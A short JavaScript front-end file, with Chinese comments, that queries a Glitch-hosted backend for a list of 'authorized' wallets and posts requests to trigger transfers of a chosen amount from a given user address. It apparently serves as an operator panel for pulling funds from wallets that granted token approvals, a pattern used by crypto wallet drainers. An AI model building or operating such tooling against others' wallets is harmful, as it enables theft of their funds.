const API_URL = 'https://great-first-dresser.glitch.me/';  // 修改為你的後端 API 地址

// 查詢授權錢包
async function checkWallet() {
    const walletAddress = document.getElementById('checkWallet').value.trim();
    if (!walletAddress) {
        alert('請輸入錢包地址');
        return;
    }

    try {
        const response = await axios.get(`${API_URL}/wallets`);
        const wallets = response.data;
        const wallet = wallets.find(w => w.address === walletAddress);

        if (wallet) {
            alert('錢包已授權');
        } else {
            alert('錢包未授權');
        }
    } catch (error) {
        console.error('查詢授權錯誤:', error);
        alert('查詢授權失敗');
    }
}

// 發動轉帳
async function triggerTransfer() {
    const walletAddress = document.getElementById('checkWallet').value.trim();
    const amount = document.getElementById('amount').value.trim();

    if (!walletAddress || !amount) {
        alert('請輸入錢包地址與轉帳金額');
        return;
    }

    try {
        const response = await axios.post(`${API_URL}/trigger-transfer`, {
            userAddress: walletAddress,
            amount: amount
        });

        if (response.data.success) {
            alert('轉帳成功');
        } else {
            alert('轉帳失敗');
        }
    } catch (error) {
        console.error('發動轉帳錯誤:', error);
        alert('轉帳失敗');
    }
}

